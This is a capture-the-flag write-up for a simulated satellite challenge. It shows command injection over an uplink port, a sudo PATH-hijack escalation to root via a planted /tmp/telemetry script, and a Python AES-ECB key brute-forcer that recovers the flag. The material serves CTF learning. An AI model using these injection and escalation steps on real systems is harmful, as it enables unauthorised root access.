## ATLAS

Atlas is a satellite, so depending on its position with respect to the groundstation, the signal varies and message reception times increase/decrease.

We have the downlink on port 5001, where we receive messages. The uplink is on 5000, from which we can send messages to the satellite.


### From the UPLINK port

We see that the satellite accepts some commands, such as 'id'. It is possible to perform command injection in different ways to obtain a larger set of commands.

Just an example:
`id; ls -la`

after some quick checks on the operating system, we discover via `sudo -l` that we can execute some commands as sudoers (e.g. network.py telemetry, network.py broadcast). We also notice that no `secure_path` is set.

`secure_path` in the sudoers file defines the explicit paths where executables can be executed with sudo.

```
com ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/network.py telemetry
com ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/network.py broadcast
```

Great, telemetry and broadcast are binaries calledy by network.py. So why not use our version of 'telemetry'?

```shell
id;echo '#!/bin/bash' >/tmp/telemetry;
id; ls -la /root
id;chmod +x /tmp/telemetry
id;export PATH=/tmp:$PATH;sudo /usr/bin/python3 /opt/network.py telemetry
```

Ok, it works and we can run commands as `root`. Inside the `/root` directory we have the `core` binary. If we try to run it it asks us for an `identifier`. Will it be the govGPT agent that we need to deploy?

```shell
id;echo '/root/core E071119BFC83EF5C84AF01DEC888940CB191B8C006A10F130E7D0D5CF34D6C8A' >>/tmp/telemetry
id;chmod +x /tmp/telemetry
id;export PATH=/tmp:$PATH;sudo /usr/bin/python3 /opt/network.py telemetry
```
The output:

```
AES ECB 256 recognized.
Identifier Accepted. Welcome Dave.
Processing the AI instructions...
Habitable island identified (2% reliability): ckn5qI7NsMNRMCHB2ULLoobpoWdD087b
Habitable island identified (2% reliability): 33aQRdcUF988hVQ83js43jqe9H84vLc8
Habitable island identified (2% reliability): EUnpg4h5EQ9r025hM0754eT7WSh5KK9t
Habitable island identified (2% reliability): fzaAHTA6DzaEjj6KNNG6L5IGBDCg3vmI
Habitable island identified (2% reliability): 66nzwo174UJD2c7ZacBzC67VsalDo21l
Habitable island identified (2% reliability): HJa0X7285d22ZJc2bDicT78w3lG8DRwA
Habitable island identified (2% reliability): ionXm8r9c4bduClf8s1TwIdlAw396QHd
Habitable island identified (2% reliability): 99awNNK0bhwQ57uI95WWnDs2rhwghbgS
Habitable island identified (2% reliability): KYnHciP1O6F5wqR5CWR10kVN605DW6Rv
Habitable island identified (2% reliability): ldagD162NZ6q7jAoDly21f2CZ1aM9XqK
Habitable island identified (2% reliability): 22n5sYb30ixpMQJRq85h2a3dq2V3aWB7
Habitable island identified (2% reliability): NNaETtgo1DGChJ48rPMkB3q6938gPh8C
Habitable island identified (2% reliability): osndi4Zv2mB9O25x4eHBS4f70IZD20L9
Habitable island identified (2% reliability): 55aOJ50cl10cjx6A51oEv5IUDT0MtD0U
Habitable island identified (2% reliability): QCnnySljkqtP2qv1SI97mEXJuEp7ICV1
Habitable island identified (2% reliability): rha0ZnqqX3C2ZXegTxC8dZ8k3P2g5n2M
Habitable island identified (2% reliability): 88nLo8JxWI334QnJgYjp8gd1Cmtpm4r3
Habitable island identified (2% reliability): TRakPD4e754oB7K4hnes9bs2txOMB54E
Habitable island identified (2% reliability): uwnVey5l8MpBw8Tp063JAwVB6i518Ib5
Habitable island identified (2% reliability): 11auF1as9vY67xCS1RSMR1KQBtSgTt6i
Habitable island identified (2% reliability): WGn5u2TNuQ7byEL7Igz3I23rG27p08l7
Habitable island identified (2% reliability): xlaS9XYUtzqO9X4yv9u4l346x3iMx9Wa
Habitable island identified (2% reliability): 44nrks9BG0lNO25BwK75cAf70495MOv9
Habitable island identified (2% reliability): ZVaC15kIFdU0j3605zIa5VuIF5m63zGs
Habitable island identified (2% reliability): aa7baIpP421nQex162pd6QXXwUHpq2f1
Habitable island identified (2% reliability): 77803dIW5VmAlLgwXDkU7x8y3F2MF3Qk
Habitable island identified (2% reliability): CK9Zqm3De4V34EpZYs1XQs91EQL96U3Z
Habitable island identified (2% reliability): dp02594KdZQaB7M4lTY0H9s2vB40jfAc
Habitable island identified (2% reliability): 001JgCzRci5z68Vfmif1k0hPaybpYe5R
Habitable island identified (2% reliability): FZ2i7xS2PDiMDlEI17aib1KE7j6M97Ku
Habitable island identified (2% reliability): ge35w2X3OmR7yS372M5lsWZfIufVcA7J
Habitable island identified (2% reliability): 3x4G9N84198m9L4oNbOC3R46zfA4Rlgm
Habitable island identified (2% reliability): I457mij52q9ZO25RO0vF4Mf7049p2k9B
Habitable island identified (2% reliability): jH6Q1ro6n1e013q0bFq6PtuWH5Eyv1q0
Habitable island identified (2% reliability): 6m7pc6H7mIN1Qszxcu97GoXxy61VKG1T
Habitable island identified (2% reliability): L7803H28Z32ylZiA73EqX7Mm37u85ra2
Habitable island identified (2% reliability): mW9Nsc39YMfL4SF38Ylta891GG3poqLL
Habitable island identified (2% reliability): 9b0259y0Xva4n7OgDngKr902LRyyD5k4
Habitable island identified (2% reliability): O01XiSRl8QJl68XJEO3N0ShDcCTV8MVD
Habitable island identified (2% reliability): pL2w7B6s9z6YDz26rdUQ1Nwe7N62hLu6
Habitable island identified (2% reliability): 2q35yw7zw8bXys3ps8b32IZtKkX3WwFh
Habitable island identified (2% reliability): R34U93igvdK8FZ4S3H64Fp46bv8y1988
Habitable island identified (2% reliability): sA57oMBnI0Fxa2j94w7bWk570gnVaSPz
Habitable island identified (2% reliability): 5f6E1hGuHV0K13syT1KezfuKJrI63R00
Habitable island identified (2% reliability): U67de61bG2x1QgbBUArVq6jla6r7scZr
Habitable island identified (2% reliability): vP803Xsi5ZGk3zkQhp0Yh7Maf7MyH322
Habitable island identified (2% reliability): 8u9BIGxp6i3jSGH3i4198OB1483V6Yvj
Habitable island identified (2% reliability): X9025bQKfD4Wn7Qw9TA09J02N9QElX4Y
Habitable island identified (2% reliability): yE1LY05Remt568ZZIihjEE1ReS51Aifb
Habitable island identified (2% reliability): 1j2k7R6YR7Cwpn26JJ4mVlws7Dgy976Q
```
So, we know that we have 50 possible island with 2% of reliability. Another important note: `AES ECB 256`. We need a string and a secret?

Let's write a decoder.py

```python
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import binascii

def decrypt_aes_ecb(key, ciphertext):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=backend)
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return plaintext

def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <keys_file> <string_AES_ECB_256_HEX>")
        return

    keys_file = sys.argv[1]
    ciphertext_hex = sys.argv[2]

    try:
        with open(keys_file, 'r') as f:
            keys = f.readlines()
    except FileNotFoundError:
        print("Keys file not found")
        return

    try:
        ciphertext = bytes.fromhex(ciphertext_hex)
    except ValueError:
        print("No valid encrypted string")
        return

    for key in keys:
        key = key.strip()
        try:
            plaintext = decrypt_aes_ecb(key.encode('utf-8'), ciphertext)
            print(f"Key found: {key}")
            print("Plaintext:", plaintext.decode('utf-8'))
            return
        except Exception:
            pass

    print("No key found")

if __name__ == "__main__":
    main()
```

Let's try the decoder with the list of keys:

```shell
python3 decoder.py keys_file E071119BFC83EF5C84AF01DEC888940CB191B8C006A10F130E7D0D5CF34D6C8A
Key found: ckn5qI7NsMNRMCHB2ULLoobpoWdD087b
Key found: 33aQRdcUF988hVQ83js43jqe9H84vLc8
Key found: EUnpg4h5EQ9r025hM0754eT7WSh5KK9t
Key found: fzaAHTA6DzaEjj6KNNG6L5IGBDCg3vmI
Key found: 66nzwo174UJD2c7ZacBzC67VsalDo21l
Key found: HJa0X7285d22ZJc2bDicT78w3lG8DRwA
Key found: ionXm8r9c4bduClf8s1TwIdlAw396QHd
Key found: 99awNNK0bhwQ57uI95WWnDs2rhwghbgS
Key found: KYnHciP1O6F5wqR5CWR10kVN605DW6Rv
Key found: ldagD162NZ6q7jAoDly21f2CZ1aM9XqK
Key found: 22n5sYb30ixpMQJRq85h2a3dq2V3aWB7
Key found: NNaETtgo1DGChJ48rPMkB3q6938gPh8C
Key found: osndi4Zv2mB9O25x4eHBS4f70IZD20L9
Key found: 55aOJ50cl10cjx6A51oEv5IUDT0MtD0U
Plaintext: NTRLGC{TH3_54Y5H3LL5_15L4ND5}
```

